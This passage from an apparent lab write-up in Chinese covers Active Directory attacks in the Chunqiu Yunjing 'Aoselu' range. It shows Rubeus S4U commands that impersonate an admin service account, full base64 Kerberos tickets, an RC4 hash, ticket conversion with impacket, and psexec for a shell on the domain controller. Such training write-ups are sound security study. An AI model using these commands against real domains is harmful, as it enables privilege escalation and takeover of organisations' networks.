class="number">1</span>zL/JZWQKV2UJFW28pkwimjf46jgdkwgdagAwIBAKKBzgSBy32ByDCBxaCBwjCBvzCBvKAbMBmgAwIBF6ESBBDiwau1b7YA8zEtgpt++J78oRAbDkFPU0VMVUFVVE8uQ09NohIwEKADAgEBoQkwBxsFdGVzdCSjBwMFAEDhAAClERgPMjAyNTA3MTEwNjQyMzhaphEYDzIwMjUwNzExMTY0MjM4WqcRGA8yMDI1MDcxODA2NDIzOFqoEBsOQU9TRUxVQVVUTy5DT02pIzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDmFvc2VsdWF1dG8uY29t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] Building S4U2self request <span class="keyword">for</span>: <span class="string">&#x27;test$@AOSELUAUTO.COM&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: ASLSRVAD05.aoseluauto.com (172.16.34.5)</span><br><span class="line">[*] Sending S4U2self request to <span class="number">172.16</span>.<span class="number">34.5</span>:<span class="number">88</span></span><br><span class="line">[+] S4U2self success!</span><br><span class="line">[*] Got a TGS <span class="keyword">for</span> <span class="string">&#x27;SVC_ADM01&#x27;</span> to <span class="string">&#x27;test$@AOSELUAUTO.COM&#x27;</span></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFyjCCBcagAwIBBaEDAgEWooIE2TCCBNVhggTRMIIEzaADAgEFoRAbDkFPU0VMVUFVVE8uQ09NohIwEKADAgEBoQkwBxsFdGVzdCSjggSeMIIEmqADAgEXoQMCAQKiggSMBIIEiBpcDaFpskxr1Mka/vu5cxr3AiGf7wQy8gdUedySlbsgLSu+GEl8QHzfC+ONfTQIFttTGeUMwtz/g2SlmydWpNTOp6kdrZbS1vNZPWSQ+Wz/n1gmp6hvNLIWrlt3AGcU3TFnsUbVMlKoNX1Hz9MaGy/okm9FhxWslwyQ74hXgBntWL5c1EhqiewuwWEJrBILvxDN7lFer62jru2aTS9tiOAVedTJLorJwoQ14XtrRhs1wkThw7pvFjI88DVKCEs60bl6BX3fRGiol4i+puU5cPmr4IGLXTDR/YHneHXDqdIRs1bt4XMbZ1Z5jEaqygaP/<span class="number">6</span>dUovE96cgdN2kN223D5KNTaQTReoGRy0gmi4feQIbTeZ13/QFOUULw8oIelKuU0RrECo3Q3xVZaDkbTN9OGIIHIIfUVEhhQx9iYCuAIpLhtnEhVW+<span class="number">7</span>SR+<span class="number">6</span>th2ltRFAd4BCoohHvo7yVv4BsZh61SDM6rUJdWVlZ+lXu7CsiOg7ChfqBFAOXBpMODjoDeQTS4qiGJ9tUYDbdQRelRFBV9ZumQ6uVXm71Se1ypENGAwdHSWoxmKxX2A1WztwAOZpP4oQda7VmxVnDV6gpblUGwA72cyk0JwLnZqy6W1ueDpcqmrRtj2vpjEofqVs8bw+tr87xU5DdH0TEPHIoiR5ZpkIqqO73n+edil2WTqk4yTvF83VOMBEZWcNiMnijJxoNoKrtVgdoziBsICLk8SfjLrMwMWVrIM4xn6ilvYZAcy531r5Wrd47FRvaURhFf5lFvglxXdGgNoX6rUi3pvtMTQZ7RI7z3eRJH+VkSLaBhoRTrWTnnJYebpIEuwD/PGlOz9AG9WulpCqIDspCPCvc1FSwlLmq5VK0ECoUgbYT90GiWiEGKiMRB0lR1CcsBI2gdP87TnR2STO61Fea8btxiVWaDO8SW4o0jHCcEmyuetAHgu1hyj3o/r0TIR5RP0LtG3TZUs8M1JjIC07WLLzI/ymciXFzIQCqLPI/m8/z5Zo1nHVRgABIrUpLZvl+ahVRvMhid9MlX0BEnnlmbj/<span class="number">1</span>w3ugA04BJolxX0DMsno9zRHF6sLHqJoDboTrqgviE7LeLhjir2JjGgMfux7Uw0aixTHMX1AeuNIT5sC7+Yo3shUfnicV3Wt/oo1BxOqnx+AeJJyYC+bF7cBNL0ucxp7V5deidJ42QGa/XMS8iqOOLaQLtbHpdwR28BOTMVzhuqMrXprmE+<span class="number">8</span>kJVSSMKw6AxmLb29ewr/T9iMPKkkrq1CYklcVl8cLrMG0uykH8MbHOT67clQpfmHKDLW2YKaQErwFvk3b0a14bqu988ousxYmfQWYu9jUIOPZCi8YrNzbSS+lgG0Vw0loGz5qtDhqkcXQAXeTlG3s7byAs7+jHDJGfP7mBvkbWBdpJDpVvYsn361YouNu+tCiqW/IMZwn8E1ZnsVl6h80FDm4uAWxbe5het+GrbroU1HuaQQsNAEIv3qQRrvBPtUY7GGRPqBkURgevXls5GUv29KeDwzrSpiKgfYxPKr1mFCvkih2w+<span class="number">80</span>acIsnDYxQ3aabQdo4HcMIHZoAMCAQCigdEEgc59gcswgciggcUwgcIwgb+gKzApoAMCARKhIgQgFi745SGRLv1bOW2Qw5mNC0YrUMA/RtfYKJzlMCfUmt6hEBsOQU9TRUxVQVVUTy5DT02iFjAUoAMCAQqhDTALGwlTVkNfQURNMDGjBwMFAEChAAClERgPMjAyNTA3MTEwNjQyMzhaphEYDzIwMjUwNzExMTY0MjM4WqcRGA8yMDI1MDcxODA2NDIzOFqoEBsOQU9TRUxVQVVUTy5DT02pEjAQoAMCAQGhCTAHGwV0ZXN0JA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Ticket written to ticket_SVC_ADM01_to_test<span class="variable">$</span>@AOSELUAUTO.COM.kirbi</span><br><span class="line"></span><br><span class="line">[*] Impersonating user <span class="string">&#x27;SVC_ADM01&#x27;</span> to target SPN <span class="string">&#x27;cifs/ASLSRVAD05&#x27;</span></span><br><span class="line">[*] Building S4U2proxy request <span class="keyword">for</span> service: <span class="string">&#x27;cifs/ASLSRVAD05&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: ASLSRVAD05.aoseluauto.com (172.16.34.5)</span><br><span class="line">[*] Sending S4U2proxy request to domain controller <span class="number">172.16</span>.<span class="number">34.5</span>:<span class="number">88</span></span><br><span class="line">[+] S4U2proxy success!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi) <span class="keyword">for</span> SPN <span class="string">&#x27;cifs/ASLSRVAD05&#x27;</span>:</span><br><span class="line"></span><br><span class="line">      doIGXDCCBligAwIBBaEDAgEWooIFcDCCBWxhggVoMIIFZKADAgEFoRAbDkFPU0VMVUFVVE8uQ09Noh0wG6ADAgECoRQwEhsEY2lmcxsKQVNMU1JWQUQwNaOCBSowggUmoAMCARKhAwIBBKKCBRgEggUUBpJm6Q6qlSPloxxeRUbQSrVrIJjQG0PxFxx7gcNfZsnoQrJDVApcddXZhmFl8CS4544vVLbakXEJbJA015GIzn+aGUXdFT7RBs5T/kXoRp6fcOIYYGiIi/WObD/NVu9kopNIza/<span class="number">9</span>D07P65CKBHqT9BxAFkIJQVafKnv9Du4XoppSzjCCdSkjWbi0KjXOwwPloL1aP6SJLdkAZosnjnGQ2Tp5G40xM3LVRynJp3bKXD5wzKeEWcF0pdpFyBBZzjXpCfwtj37Ny6MsUv6xi4WtLr5VuhPIECJ3k8QZ4KKpxfpPlAzMp6RaPL+<span class="number">3</span>lNBqpRJRP7Mq39nqOQmSmVKmO9eNpjjYMElCWCA2zSfN4F+hXsztv92Mdoqbh9ulsovEAuO8f4fie7NwqL3Mg2DwPzF8AvkBlX7WVjecoVKzyarBnntMhKQcG5Cbl3Y8HjaAuAhaMVM7gzudNBz8j+xYLJ8f+<span class="number">2</span>O/PO7MAFm9TQAyFirVbpWQqRRHnj19nzAfJ66N4bs5x7dsk/g4Mn2Qfk/YYDqeQYt+WFQszVzPsAcxgZkZ2LtV4nq0Nsj9CdKkF8W1sD25qDuvZ7kzLnalJRlCbWQzCO3GSQQv1gWXGS+jIRBIaSOKwpg0MbHaYmAme7TjXBKu5ZqpNwF8KzgPrKqeHiSBGr29OefUL62V+NRXI5isvnoC+<span class="number">31</span>r1jC05a9XkbNeOkebOqT35hNu9EtUuxICHgiY1PVR2FqXEanYyOpC8V4nOePeMA9VUZ/KEQ5uiVyTX+aqA64APbii2ZZ1XJ1EBU07ZOvb0reuxLWScyiTCvjoJ6TlD8Em6tYAFgVyXSCNHeT8ZoA8etiVy/Sc7ItrRHIJTUIoacuvDxkDHDWfFZIU8kWmOomLYpqi/v8QmVU7W8o71U3+AX5CGgZb6WmC3N8QTrUQKyinhQgy5eG2haD03l21JCJO1avslc4UWzT/bXpmU6aGVMD1HfMEvT0kMUrqKI2BuKZVu+PNURdv5enn5hG2rklN4kjSev3pmaq20lKh9pOfBF9+Ll4aQ17R2wcqfpI9TLp+<span class="number">2</span>r8LYgwUsV6rwT+VKQyRzPZDiX6NJt3Ryd3J4H5sItgWLVg6Dt+c/<span class="number">0</span>FhBD2rXbhdKL7EHbwEble9O1uVrhLjsRV3+afqkM++k+c/c7m5UGvpwxkFGyLJRyXUrdlBtn9uCPG0LVYkihwAdBzm4E01GUow4ZdrWo2FCpEmTUkHARcymI+UQfDBVYgQ5K3XX6ZsKIf6OZ8Xgu9YQlHClM/ZBcDtkc+bFYbRBnZIjAZ45NjgIwNOIQM7glAShenEFd4MfItcVFjVAw+H8OYwgGZSSvdXLd7/<span class="number">9</span>hBn7KMssfZLQV8M3JovKeg+z2GYp0Djy7ucNWwbSW338sR02MP7Apkhk3<span class="built_in">rv</span>/yHRD01C2mj4DCH3PW0AUacyehUYpzlj5WWDogNl/<span class="number">1</span>+GKsdaoBLptLJ1r9+K1ZuHIX5w5SJemvTgmoyOGjW1ZvXpskzydT9Np9VaNi+uiNs5U7rVIu7/vlElNKHkIFLSdE/d1iqSywMslVtraFmaOOrRMqPCRo9L6n+<span class="number">4</span>OGDbmNOazwvrUh7ug8sQOLNZmt6Brl5a+loXqP5o7EorbcVbln/<span class="number">0</span>r33StBSyLKYPHlFbxfQm8ccBYFJRDWrIBXsgirri3aTfTdF/NDwfDVzWyTiO4NwPEEPiWChYpG8s8l/yIQ6fqmjyEZ1Xi2MpJQqfPdvUEmbRv3lOnr4WyiwUiqOB1zCB1KADAgEAooHMBIHJfYHGMIHDoIHAMIG9MIG6oBswGaADAgERoRIEEGq+Upi69XRHv/o7x5QguAqhEBsOQU9TRUxVQVVUTy5DT02iFjAUoAMCAQqhDTALGwlTVkNfQURNMDGjBwMFAEClAAClERgPMjAyNTA3MTEwNjQyMzhaphEYDzIwMjUwNzExMTY0MjM4WqcRGA8yMDI1MDcxODA2NDIzOFqoEBsOQU9TRUxVQVVUTy5DT02pHTAboAMCAQKhFDASGwRjaWZzGwpBU0xTUlZBRDA1</span><br></pre></td></tr></table></figure><p>导入成功了，这里其实可以直接dir读取flag了，但是我还是想尝试ptt</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/52.png"></p><p>.\Rubeus.exe hash &#x2F;password:123@#ABC &#x2F;user:test$ &#x2F;domain:aoseluauto.com复制最后这个base64的票据，把他由 <code>.kirbi</code> 转换为impacket支持的 <code>.ccache</code> 格式</p><p><font style="color:rgb(218, 219, 248);background-color:rgb(20, 19, 39);"></font></p><p><font style="color:rgb(218, 219, 248);background-color:rgb(20, 19, 39);"></font></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> doIGXDCCBligAwIBBaEDAgEWooIFcDCCBWxhggVoMIIFZKADAgEFoRAbDkFPU0VMVUFVVE8uQ09Noh0wG6ADAgECoRQwEhsEY2lmcxsKQVNMU1JWQUQwNaOCBSowggUmoAMCARKhAwIBBKKCBRgEggUUBpJm6Q6qlSPloxxeRUbQSrVrIJjQG0PxFxx7gcNfZsnoQrJDVApcddXZhmFl8CS4544vVLbakXEJbJA015GIzn+aGUXdFT7RBs5T/kXoRp6fcOIYYGiIi/WObD/NVu9kopNIza/<span class="number">9</span>D07P65CKBHqT9BxAFkIJQVafKnv9Du4XoppSzjCCdSkjWbi0KjXOwwPloL1aP6SJLdkAZosnjnGQ2Tp5G40xM3LVRynJp3bKXD5wzKeEWcF0pdpFyBBZzjXpCfwtj37Ny6MsUv6xi4WtLr5VuhPIECJ3k8QZ4KKpxfpPlAzMp6RaPL+<span class="number">3</span>lNBqpRJRP7Mq39nqOQmSmVKmO9eNpjjYMElCWCA2zSfN4F+hXsztv92Mdoqbh9ulsovEAuO8f4fie7NwqL3Mg2DwPzF8AvkBlX7WVjecoVKzyarBnntMhKQcG5Cbl3Y8HjaAuAhaMVM7gzudNBz8j+xYLJ8f+<span class="number">2</span>O/PO7MAFm9TQAyFirVbpWQqRRHnj19nzAfJ66N4bs5x7dsk/g4Mn2Qfk/YYDqeQYt+WFQszVzPsAcxgZkZ2LtV4nq0Nsj9CdKkF8W1sD25qDuvZ7kzLnalJRlCbWQzCO3GSQQv1gWXGS+jIRBIaSOKwpg0MbHaYmAme7TjXBKu5ZqpNwF8KzgPrKqeHiSBGr29OefUL62V+NRXI5isvnoC+<span class="number">31</span>r1jC05a9XkbNeOkebOqT35hNu9EtUuxICHgiY1PVR2FqXEanYyOpC8V4nOePeMA9VUZ/KEQ5uiVyTX+aqA64APbii2ZZ1XJ1EBU07ZOvb0reuxLWScyiTCvjoJ6TlD8Em6tYAFgVyXSCNHeT8ZoA8etiVy/Sc7ItrRHIJTUIoacuvDxkDHDWfFZIU8kWmOomLYpqi/v8QmVU7W8o71U3+AX5CGgZb6WmC3N8QTrUQKyinhQgy5eG2haD03l21JCJO1avslc4UWzT/bXpmU6aGVMD1HfMEvT0kMUrqKI2BuKZVu+PNURdv5enn5hG2rklN4kjSev3pmaq20lKh9pOfBF9+Ll4aQ17R2wcqfpI9TLp+<span class="number">2</span>r8LYgwUsV6rwT+VKQyRzPZDiX6NJt3Ryd3J4H5sItgWLVg6Dt+c/<span class="number">0</span>FhBD2rXbhdKL7EHbwEble9O1uVrhLjsRV3+afqkM++k+c/c7m5UGvpwxkFGyLJRyXUrdlBtn9uCPG0LVYkihwAdBzm4E01GUow4ZdrWo2FCpEmTUkHARcymI+UQfDBVYgQ5K3XX6ZsKIf6OZ8Xgu9YQlHClM/ZBcDtkc+bFYbRBnZIjAZ45NjgIwNOIQM7glAShenEFd4MfItcVFjVAw+H8OYwgGZSSvdXLd7/<span class="number">9</span>hBn7KMssfZLQV8M3JovKeg+z2GYp0Djy7ucNWwbSW338sR02MP7Apkhk3<span class="built_in">rv</span>/yHRD01C2mj4DCH3PW0AUacyehUYpzlj5WWDogNl/<span class="number">1</span>+GKsdaoBLptLJ1r9+K1ZuHIX5w5SJemvTgmoyOGjW1ZvXpskzydT9Np9VaNi+uiNs5U7rVIu7/vlElNKHkIFLSdE/d1iqSywMslVtraFmaOOrRMqPCRo9L6n+<span class="number">4</span>OGDbmNOazwvrUh7ug8sQOLNZmt6Brl5a+loXqP5o7EorbcVbln/<span class="number">0</span>r33StBSyLKYPHlFbxfQm8ccBYFJRDWrIBXsgirri3aTfTdF/NDwfDVzWyTiO4NwPEEPiWChYpG8s8l/yIQ6fqmjyEZ1Xi2MpJQqfPdvUEmbRv3lOnr4WyiwUiqOB1zCB1KADAgEAooHMBIHJfYHGMIHDoIHAMIG9MIG6oBswGaADAgERoRIEEGq+Upi69XRHv/o7x5QguAqhEBsOQU9TRUxVQVVUTy5DT02iFjAUoAMCAQqhDTALGwlTVkNfQURNMDGjBwMFAEClAAClERgPMjAyNTA3MTEwNjQyMzhaphEYDzIwMjUwNzExMTY0MjM4WqcRGA8yMDI1MDcxODA2NDIzOFqoEBsOQU9TRUxVQVVUTy5DT02pHTAboAMCAQKhFDASGwRjaWZzGwpBU0xTUlZBRDA1 &gt; ticket.kirbi.b64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ticket.kirbi.b64 |tr <span class="literal">-d</span> <span class="string">&#x27; &#x27;</span> |tr <span class="literal">-d</span> <span class="string">&#x27;\n&#x27;</span> |base64 <span class="literal">-d</span> &gt;ticket.kirbi</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">kali</span>/<span class="type">red</span>/<span class="type">temp</span>]</span><br><span class="line">└─<span class="comment"># echo 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 &gt; ticket.kirbi.b64</span></span><br><span class="line">                                                                                                                                                                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">kali</span>/<span class="type">red</span>/<span class="type">temp</span>]</span><br><span class="line">└─<span class="comment"># cat ticket.kirbi.b64 |tr -d &#x27; &#x27; |tr -d &#x27;\n&#x27; |base64 -d &gt;ticket.kirbi</span></span><br><span class="line">                                                                                                                                                                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">kali</span>/<span class="type">red</span>/<span class="type">temp</span>]</span><br><span class="line">└─<span class="comment"># impacket-ticketConverter ticket.kirbi ticket.ccache</span></span><br><span class="line">Impacket v0.<span class="number">11.0</span> - Copyright <span class="number">2023</span> Fortra</span><br><span class="line"></span><br><span class="line">[*] converting kirbi to ccache...</span><br><span class="line">[+] done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">kali</span>/<span class="type">red</span>/<span class="type">temp</span>]</span><br><span class="line">└─<span class="comment"># export KRB5CCNAME=ticket.ccache</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里导入票据后仍然不行，前面是无法请求到票据，现在即使获取到了票据也无法成功</p><p>可能由于我kali不能与域控时间同步，所以一直无法成功，最后我选择直接使用 <font style="color:rgb(0,0,0);">IPC$共享管道进行访问（回头看，感觉是因为多层代理，vshell并不能实现，需要使用stowaway搭建多层代理才行）</font></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/53.png"></p><p>使用Rubeus.exe查看，发现票据其实已经导入成功了的</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\hub&gt;.\Rubeus.exe klist</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">2.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Action: List Kerberos Tickets (Current User)</span><br><span class="line"></span><br><span class="line">[*] Current LUID    : <span class="number">0</span>x115535</span><br><span class="line"></span><br><span class="line">  UserName                 : hub</span><br><span class="line">  Domain                   : ASLSRVFS02</span><br><span class="line">  LogonId                  : <span class="number">0</span>x115535</span><br><span class="line">  UserSID                  : S<span class="literal">-1-5-21-3738990733-2195238930-2414615058-1000</span></span><br><span class="line">  AuthenticationPackage    : NTLM</span><br><span class="line">  LogonType                : RemoteInteractive</span><br><span class="line">  LogonTime                : <span class="number">7</span>/<span class="number">10</span>/<span class="number">2025</span> <span class="number">9</span>:<span class="number">51</span>:<span class="number">36</span> PM</span><br><span class="line">  LogonServer              : ASLSRVFS02</span><br><span class="line">  LogonServerDNSDomain     :</span><br><span class="line">  UserPrincipalName        :</span><br><span class="line"></span><br><span class="line">    [<span class="number">0</span>] - <span class="number">0</span>x12 - aes256_cts_hmac_sha1</span><br><span class="line">      <span class="built_in">Start</span>/<span class="keyword">End</span>/MaxRenew: <span class="number">7</span>/<span class="number">10</span>/<span class="number">2025</span> <span class="number">11</span>:<span class="number">42</span>:<span class="number">38</span> PM ; <span class="number">7</span>/<span class="number">11</span>/<span class="number">2025</span> <span class="number">9</span>:<span class="number">42</span>:<span class="number">38</span> AM ; <span class="number">7</span>/<span class="number">17</span>/<span class="number">2025</span> <span class="number">11</span>:<span class="number">42</span>:<span class="number">38</span> PM</span><br><span class="line">      Server Name       : cifs/ASLSRVAD05 <span class="selector-tag">@</span> AOSELUAUTO.COM</span><br><span class="line">      Client Name       : SVC_ADM01 <span class="selector-tag">@</span> AOSELUAUTO.COM  <span class="comment">#可以发现这里已经有管理员的票据了</span></span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (<span class="number">40</span>a50000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用其他用户打的话无法访问 <code>c$</code> 共享或使用 psexec 启动 cmd，因为我们需要本地管理员权限</p><p>这里如果直接使用本地管理员反而不行，这里应该做了限制，原本我试了好多次都不行（回过头看，感觉是因为票据导入的是新增的hub账号）</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/54.png"></p><p>最后使用新增的用户反而可以了（票据导入的hub账号，这里也是为什么hub账号可以）反正总之就是多试几次吧</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/55.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/56.png"></p><p>使用impacket请求票据的后续</p><p>这里还有其他将票据导入等方法，但是可能由于我kali不能与域控时间同步，所以一直无法成功</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket<span class="literal">-psexec</span> AOSELUAUTO.COM/SVC_ADM01@<span class="number">172.16</span>.<span class="number">34.5</span> <span class="literal">-k</span> <span class="literal">-no-pass</span></span><br></pre></td></tr></table></figure><p>正常可以直接通过psexec直接获取shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">C:\users\Administrator\desktop&gt;Rubeus.exe s4u /user:EVILCOMPUTER<span class="variable">$</span> /rc4:<span class="number">3</span>A37C6AC3AFBEEF7A8EB36A4481BDED4 /domain:aoseluauto.com /msdsspn:cifs/ASLSRVAD05 /impersonateuser:SVC_ADM01 /nowrap /ptt</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">2.2</span></span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> rc4_hmac hash: 3A37C6AC3AFBEEF7A8EB36A4481BDED4</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ preauth) <span class="keyword">for</span>: <span class="string">&#x27;aoseluauto.com\EVILCOMPUTER$&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: 172.16.34.5:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      